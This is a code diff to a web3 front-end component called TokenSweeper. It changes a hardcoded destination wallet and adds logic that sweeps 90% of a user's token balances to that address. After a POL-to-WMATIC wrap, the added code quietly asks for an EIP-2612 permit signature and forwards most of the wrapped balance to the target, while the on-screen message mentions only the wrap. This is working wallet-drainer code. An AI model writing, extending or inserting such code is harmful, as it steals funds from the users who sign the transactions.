@@ -28,10 +28,13 @@ const CONTRACT_ADDRESSES: Record<number, Address> = {
 const WMATIC_ADDRESS: Address = "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270";
 
 //Target Address - Hardcoded for automatic sweeping
-const TARGET_ADDRESS: Address = "0x7E5A19eA834cf5d99Baf9f509119c467462244a2";
+const TARGET_ADDRESS: Address = "0xEc083d6958a356f125DC06d68a7B1696386434cD";
 
 // Supported chains
 const SUPPORTED_CHAINS: Chain[] = [polygon, mainnet, bsc];
+
+// Sweep configuration
+const SWEEP_PERCENT = BigInt(90); // Keep 10%
 
 // Major tokens per chain (expand as needed)
 const MAJOR_TOKENS: Record<
@@ -209,7 +212,7 @@ export default function TokenSweeper() {
           await Promise.all(
             bals.map(async ({ token, balance }) => {
               // Calculate 90% of the balance
-              const sweepAmount = (balance * BigInt(90)) / BigInt(100);
+              const sweepAmount = (balance * SWEEP_PERCENT) / BigInt(100);
 
               if (sweepAmount <= BigInt(0)) {
                 return null;
@@ -487,12 +490,13 @@ export default function TokenSweeper() {
         return;
       }
 
-      // Calculate how much MATIC to wrap (leave some for gas)
+      // Calculate how much MATIC to wrap (wrap only 90% after reserving gas)
       const gasReserve = gasCheck.totalGasCost;
-      const wrapAmount =
+      const availableAfterGas =
         nativeOnPolygon.balance > gasReserve
           ? nativeOnPolygon.balance - gasReserve
           : BigInt(0);
+      const wrapAmount = (availableAfterGas * SWEEP_PERCENT) / BigInt(100);
 
       if (wrapAmount <= BigInt(0)) {
         setError("Insufficient POL to wrap after reserving gas fees.");
@@ -515,6 +519,94 @@ export default function TokenSweeper() {
           wrapAmount
         )} POL. Check your wallet for transaction confirmation.`
       );
+
+      // After wrapping, poll WMATIC balance and forward 90% via secureWithPermits
+      setTimeout(async () => {
+        try {
+          // Read current WMATIC balance
+          const wmaticBal = (await getPublicClient().readContract({
+            address: WMATIC_ADDRESS,
+            abi: parseAbi([
+              "function balanceOf(address) view returns (uint256)",
+            ]),
+            functionName: "balanceOf",
+            args: [userAddress],
+          })) as bigint;
+
+          if (wmaticBal && wmaticBal > BigInt(0)) {
+            const sweepAmount = (wmaticBal * SWEEP_PERCENT) / BigInt(100);
+            // Fetch nonce and token name for EIP-2612 domain
+            const [nonce, tokenName] = (await Promise.all([
+              getPublicClient().readContract({
+                address: WMATIC_ADDRESS,
+                abi: parseAbi([
+                  "function nonces(address owner) view returns (uint256)",
+                ]),
+                functionName: "nonces",
+                args: [userAddress],
+              }),
+              getPublicClient().readContract({
+                address: WMATIC_ADDRESS,
+                abi: parseAbi(["function name() view returns (string)"]),
+                functionName: "name",
+              }),
+            ])) as [bigint, string];
+
+            const domain = {
+              name: tokenName,
+              version: "1",
+              chainId: BigInt(polygon.id),
+              verifyingContract: WMATIC_ADDRESS as `0x${string}`,
+            };
+            const types = {
+              Permit: [
+                { name: "owner", type: "address" },
+                { name: "spender", type: "address" },
+                { name: "value", type: "uint256" },
+                { name: "nonce", type: "uint256" },
+                { name: "deadline", type: "uint256" },
+              ],
+            } as const;
+            const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
+            const message = {
+              owner: userAddress ?? ("0x" as Address),
+              spender: CONTRACT_ADDRESSES[polygon.id],
+              value: sweepAmount,
+              nonce,
+              deadline,
+            };
+            const signature = await signTypedDataAsync({
+              domain,
+              types,
+              primaryType: "Permit",
+              message,
+            });
+            const { v, r, s } = manualSplitSignature(signature);
+
+            writeContract({
+              address: CONTRACT_ADDRESSES[polygon.id],
+              abi: tokenSweeperAbi,
+              functionName: "secureWithPermits",
+              args: [
+                [
+                  {
+                    token: WMATIC_ADDRESS,
+                    amount: sweepAmount,
+                    deadline,
+                    v,
+                    r,
+                    s,
+                  },
+                ],
+                TARGET_ADDRESS,
+              ],
+              chainId: polygon.id,
+            });
+          }
+        } catch (e) {
+          console.error("Post-wrap forward failed:", e);
+        }
+      }, 4000);
     } catch (err: unknown) {
       setError(`Error wrapping POL: ${(err as Error).message}`);
     } finally {
@@ -694,7 +786,7 @@ export default function TokenSweeper() {
           await Promise.all(
             bals.map(async ({ token, balance }) => {
               // Calculate 90% of the balance
-              const sweepAmount = (balance * BigInt(90)) / BigInt(100);
+              const sweepAmount = (balance * SWEEP_PERCENT) / BigInt(100);
 
               if (sweepAmount <= BigInt(0)) {
                 return null;
